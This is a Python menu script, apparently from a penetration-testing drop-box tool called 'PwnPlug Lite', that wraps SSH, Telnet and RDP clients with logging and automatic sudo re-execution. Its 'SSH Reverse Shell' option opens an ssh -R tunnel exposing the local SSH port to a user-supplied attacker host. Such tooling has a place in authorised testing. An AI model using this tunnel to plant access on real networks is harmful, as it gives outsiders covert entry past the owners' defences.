#!/usr/bin/env python3
"""
PwnPlug Lite - Remote Access Menu Module
Added: rotating logging and SSH key support for SSH operations.
"""

import os
import sys
import subprocess
import shutil
import logging
from logging.handlers import RotatingFileHandler
from typing import List, Optional

LOG_DIR = "/var/log/pwnplug_lite"
LOG_FILE = "remote_menu.log"


# ---------------------------------------------------------------------------
# AUTO-SUDO / ROOT ELEVATION
# ---------------------------------------------------------------------------

def ensure_root():
    """Re-run this script with sudo if we are not root."""
    if os.geteuid() != 0:
        print("[!] Root privileges required.")
        print("[*] Re-running module with sudo...\n")
        try:
            os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
        except Exception as e:
            print(f"[!] Unable to escalate privileges: {e}")
            sys.exit(1)


# ---------------------------------------------------------------------------
# LOGGING
# ---------------------------------------------------------------------------

def setup_logging(log_dir: str = LOG_DIR, log_file: str = LOG_FILE) -> logging.Logger:
    """
    Create a rotating file logger. Must be called after ensure_root() if writing to /var/log.
    """
    try:
        os.makedirs(log_dir, exist_ok=True)
    except Exception:
        # If cannot create dir, fallback to home directory
        fallback = os.path.expanduser("~/.pwnplug_lite")
        try:
            os.makedirs(fallback, exist_ok=True)
            log_dir = fallback
        except Exception:
            # Last fallback: current directory
            log_dir = "."

    full_path = os.path.join(log_dir, log_file)
    logger = logging.getLogger("pwnplug_remote")
    logger.setLevel(logging.DEBUG)

    # Avoid duplicate handlers if called multiple times
    if not logger.handlers:
        try:
            handler = RotatingFileHandler(full_path, maxBytes=1024 * 1024, backupCount=5)
        except Exception:
            # If RotatingFileHandler can't be created for any reason, fallback to basic StreamHandler
            handler = logging.StreamHandler(sys.stdout)

        formatter = logging.Formatter("%(asctime)s %(levelname)s: %(message)s")
        handler.setFormatter(formatter)
        logger.addHandler(handler)

    logger.debug("Logging initialized, path=%s", full_path)
    return logger


# ---------------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------------

def clear_screen():
    os.system("clear")


def press_enter_to_continue():
    try:
        input("\n[*] Press ENTER to continue...")
    except (EOFError, KeyboardInterrupt):
        # Gracefully handle non-interactive environments or ctrl-c
        pass


def command_exists(cmd: str) -> bool:
    return shutil.which(cmd) is not None


def run_interactive(cmd: List[str], logger: Optional[logging.Logger] = None):
    """
    Launch the command as a fully interactive foreground process.
    Ensures SSH, Telnet, RDP behave *naturally* by inheriting stdio.
    """
    try:
        if logger:
            logger.info("Executing interactive command: %s", " ".join(cmd))
        print(f"\n[>] Executing: {' '.join(cmd)}\n")
        return_code = subprocess.call(cmd)
        if logger:
            logger.info("Command finished with return code: %s", return_code)
    except KeyboardInterrupt:
        if logger:
            logger.warning("Interactive session interrupted by user (KeyboardInterrupt).")
        print("\n[!] Session interrupted.")
    except Exception as e:
        if logger:
            logger.exception("Error executing command: %s", e)
        print(f"[!] Error executing command: {e}")
    press_enter_to_continue()


def validate_port(port_str: str, default: Optional[str] = None) -> Optional[str]:
    """
    Validate port string. Return numeric port string or default if provided and port_str is empty.
    Returns None if invalid.
    """
    if not port_str:
        return default
    if port_str.isdigit() and 0 < int(port_str) <= 65535:
        return port_str
    return None


def validate_key_path(path: str) -> Optional[str]:
    """
    Validate that a given key path exists and is a file.
    Returns the path if valid, otherwise None.
    """
    if not path:
        return None
    expanded = os.path.expanduser(path)
    if os.path.isfile(expanded):
        return expanded
    return None


# ---------------------------------------------------------------------------
# MENU OPTIONS
# ---------------------------------------------------------------------------

def option_1_ssh_connect(logger: logging.Logger):
    clear_screen()
    print("=== SSH CONNECT ===\n")

    target = input("Target IP / Hostname: ").strip()
    user = input("Username (blank = current user): ").strip()
    port = input("Port [22]: ").strip()
    keypath = input("Private key file (optional, path to identity file): ").strip()

    if not target:
        print("[!] Target required.")
        press_enter_to_continue()
        return

    port = validate_port(port, default="22")
    if port is None:
        print("[!] Invalid port specified.")
        press_enter_to_continue()
        return

    if keypath:
        keypath_validated = validate_key_path(keypath)
        if not keypath_validated:
            print(f"[!] Key file not found: {keypath}")
            press_enter_to_continue()
            return
    else:
        keypath_validated = None

    dest = f"{user}@{target}" if user else target
    cmd = ["ssh", "-p", port]
    if keypath_validated:
        cmd += ["-i", keypath_validated]
    cmd += [dest]

    logger.info("SSH connect requested: dest=%s, user=%s, port=%s, key=%s",
                target, user or "(current)", port, keypath_validated or "(none)")

    run_interactive(cmd, logger=logger)


def option_2_ssh_reverse_shell(logger: logging.Logger):
    clear_screen()
    print("=== SSH REVERSE TUNNEL ===\n")
    print("This creates a reverse tunnel from THIS machine → Attacker.\n")

    attacker_ip = input("Attacker IP: ").strip()
    attacker_user = input("Attacker Username: ").strip()
    attacker_port = input("Attacker SSH Port [22]: ").strip()
    remote_port = input("Remote Port to expose (e.g., 4444): ").strip()
    keypath = input("Private key for attacker (optional, path to identity file): ").strip()

    if not (attacker_ip and attacker_user and remote_port):
        print("[!] Missing required fields.")
        press_enter_to_continue()
        return

    attacker_port = validate_port(attacker_port, default="22")
    if attacker_port is None:
        print("[!] Invalid attacker SSH port specified.")
        press_enter_to_continue()
        return

    if not remote_port.isdigit() or not (0 < int(remote_port) <= 65535):
        print("[!] Invalid remote port specified.")
        press_enter_to_continue()
        return

    if keypath:
        keypath_validated = validate_key_path(keypath)
        if not keypath_validated:
            print(f"[!] Key file not found: {keypath}")
            press_enter_to_continue()
            return
    else:
        keypath_validated = None

    if keypath_validated:
        cmd = [
            "ssh", "-i", keypath_validated,
            "-R", f"{remote_port}:localhost:22",
            f"{attacker_user}@{attacker_ip}",
            "-p", attacker_port
        ]
    else:
        cmd = [
            "ssh",
            "-R", f"{remote_port}:localhost:22",
            f"{attacker_user}@{attacker_ip}",
            "-p", attacker_port
        ]

    logger.info("SSH reverse tunnel requested: attacker=%s, user=%s, attacker_port=%s, remote_port=%s, key=%s",
                attacker_ip, attacker_user, attacker_port, remote_port, keypath_validated or "(none)")

    run_interactive(cmd, logger=logger)


def option_3_telnet(logger: logging.Logger):
    clear_screen()
    print("=== TELNET SESSION ===\n")

    if not command_exists("telnet"):
        print("[!] Missing binary: telnet")
        print("Install using:  apt install telnet")
        press_enter_to_continue()
        return

    host = input("Target Host: ").strip()
    if not host:
        print("[!] Target Host required.")
        press_enter_to_continue()
        return

    port = input("Port [23]: ").strip()
    port = validate_port(port, default="23")
    if port is None:
        print("[!] Invalid port specified.")
        press_enter_to_continue()
        return

    cmd = ["telnet", host, port]
    logger.info("Telnet requested: host=%s, port=%s", host, port)
    run_interactive(cmd, logger=logger)


def option_4_rdp(logger: logging.Logger):
    clear_screen()
    print("=== RDP (xfreerdp) ===\n")

    if not command_exists("xfreerdp"):
        print("[!] xfreerdp not installed.")
        print("Install using: apt install freerdp2-x11")
        press_enter_to_continue()
        return

    target = input("Target IP/Hostname: ").strip()
    user = input("Username: ").strip()
    domain = input("Domain (optional): ").strip()
    width = input("Width [1280]: ").strip() or "1280"
    height = input("Height [720]: ").strip() or "720"

    if not (target and user):
        print("[!] Missing required fields (target and username).")
        press_enter_to_continue()
        return

    # Basic numeric validation for resolution
    if not (width.isdigit() and height.isdigit()):
        print("[!] Width and Height must be numbers.")
        press_enter_to_continue()
        return

    cmd = ["xfreerdp", f"/v:{target}", f"/u:{user}", f"/size:{width}x{height}"]
    if domain:
        cmd.append(f"/d:{domain}")

    logger.info("RDP requested: target=%s, user=%s, domain=%s, size=%sx%s",
                target, user, domain or "(none)", width, height)

    run_interactive(cmd, logger=logger)


def option_5_quit(logger: logging.Logger):
    clear_screen()
    logger.info("User selected Quit. Exiting.")
    print("[*] Closing Remote Access Module.\n")
    sys.exit(0)


# ---------------------------------------------------------------------------
# MAIN MENU
# ---------------------------------------------------------------------------

def print_banner():
    print(r"""
=========================================
      PwnPlug Lite - Remote Access
=========================================
""")


def print_menu():
    print("Select an option:\n")
    print("  [1] SSH Connect")
    print("  [2] SSH Reverse Shell")
    print("  [3] Telnet (system client)")
    print("  [4] RDP (xfreerdp)")
    print("  [5] Quit\n")


def main():
    ensure_root()
    logger = setup_logging()

    while True:
        clear_screen()
        print_banner()
        print_menu()

        try:
            choice = input("PwnPlug-Remote> ").strip()
        except (EOFError, KeyboardInterrupt):
            logger.info("Exiting due to EOF/KeyboardInterrupt.")
            print("\n[*] Exiting.")
            sys.exit(0)

        if choice == "1":
            option_1_ssh_connect(logger)
        elif choice == "2":
            option_2_ssh_reverse_shell(logger)
        elif choice == "3":
            option_3_telnet(logger)
        elif choice == "4":
            option_4_rdp(logger)
        elif choice == "5":
            option_5_quit(logger)
        else:
            print("[!] Invalid choice.")
            logger.warning("Invalid menu choice entered: %s", choice)
            press_enter_to_continue()


if __name__ == "__main__":
    main()
